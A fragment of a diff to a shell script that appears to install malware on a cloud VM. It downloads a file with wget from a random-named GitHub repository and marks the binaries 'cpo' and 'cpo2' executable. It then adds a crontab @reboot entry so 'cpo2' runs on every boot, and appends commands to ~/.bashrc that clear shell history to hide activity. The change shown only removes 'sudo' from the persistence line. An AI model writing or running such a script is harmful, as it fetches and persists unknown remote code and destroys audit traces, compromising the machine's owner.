@@ -10,7 +10,7 @@ wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkf
 chmod ugo+x cpo2
 chmod ugo+x cpo
 sudo systemctl enable cron
-sudo crontab -l | { cat; echo "@reboot /home/azureuser/cpo2"; } | crontab
+crontab -l | { cat; echo "@reboot /home/azureuser/cpo2"; } | crontab
 echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
 echo ". history -cw" >> ~/.bashrc
 sleep 7
